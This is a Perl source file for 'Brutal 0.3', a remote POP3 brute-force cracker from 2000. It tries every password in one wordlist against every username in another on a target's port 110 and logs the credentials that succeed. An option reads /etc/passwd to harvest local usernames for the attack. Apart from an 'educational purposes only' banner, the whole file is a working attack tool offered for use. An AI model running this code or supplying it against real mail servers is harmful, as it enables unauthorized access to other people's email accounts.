#!/usr/bin/perl 
##
##  [Brutal 0.3]
##  (C) 2000 - Yo_Soy <yo_soy@raza-mexicana.org>
##
##  Brutal is a remote POP3 brute force cracker. Brutal uses two
##  wordlists, one for usernames and other for passwords, so it
##  checks every password for each username. 
##
##  FOR EDUCATIONAL PURPOSES ONLY
##
##  [ http://www.raza-mexicana.org ]                     [-MEXICO-]
###################################################################
##

use Socket; use Getopt::Std;

print ("\nBrutal 0.3 - POP3 Brute Force Attack\n");
print ("by Yo_Soy - <yo_soy\@raza-mexicana.org>\n");

getopts("h:u:p:d:l", \%args);

&uso if (!%args);
&dump if (defined $args{d});

$logfile = defined $args{l} ? "$args{l}" : "$args{h}.log";
$userfile = defined $args{d} ? "dumped.txt" : "$args{u}";
$passfile = defined $args{d} ? "dumped.txt" : "$args{p}";

open (LOG, ">$logfile")  || die ("Error writing log file\n");
open (USERNAMES, "<$userfile") || die ("Error opening usernames file\n");
open (PASSNAMES, "<$passfile") || die ("Error opening passwords file\n");
$pass = <PASSNAMES>;  chomp ($pass);
$user = <USERNAMES>;  chomp ($user);
while ($pass ne "") {
  while ($user ne "") {
    $NETFD = conexion($args{h});
    sysread ($NETFD, $mensaje, 100);    
    send ($NETFD, "user $user\n", 0);
    sleep(1);
    sysread ($NETFD, $mensaje, 100);    
    send ($NETFD, "pass $pass\n", 0);
    sleep(1);
    sysread ($NETFD, $mensaje, 3);
    sleep(1);
    print ("Trying User: $user\t\tPass: $pass\n");
    if ($mensaje =~ /^\+OK/) { &encontrado; }
    $user = <USERNAMES>;
    chomp ($user);
  }
  close (USERNAMES); 
  open (USERNAMES, "<$userfile"); 
  $user = <USERNAMES>;
  chomp ($user);
  $pass = <PASSNAMES>;
  chomp ($pass);
}
### When an account is found
sub encontrado {
   $encontrado = "([*]) User: $user\t\tPass: $pass\n";
   print ("$encontrado");
   print LOG ("$encontrado"); }

### The use of the program
sub uso {
print qq!
Usage:  $0 <options>

 Options:
          -h  hostname
          -u  user names file
          -p  passwords file
          -d  dump usernames
          -l  log file

Use the -d option to dump the usernames directly from the /etc/passwd file
instead of using the -u and -p options.

!; exit;}

### Dumping usernames from /etc/passwd
sub dump {
  open (LOGIN, ">dumped.txt") || die ("Unable to write dumped.txt\n");
  open (ETC, "</etc/passwd") || die ("Unable to open /etc/passwd\n");
  $linea = <ETC>;
  while ($linea ne "") {
    @array = split(/:/, $linea);
    print LOGIN ("$array[0]\n");
    $linea = <ETC>;  }
  close LOGIN;
  close ETC; }

### Socket connection
sub conexion {
   $iaddr = inet_aton($_[0]) || die("Invalid host $_[0]\n");
   $paddr = sockaddr_in("110", $iaddr);
   socket(CONNFD, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
   connect(CONNFD, $paddr) || die ("Couldn't connect $_[0]:110\n");
   return CONNFD; }
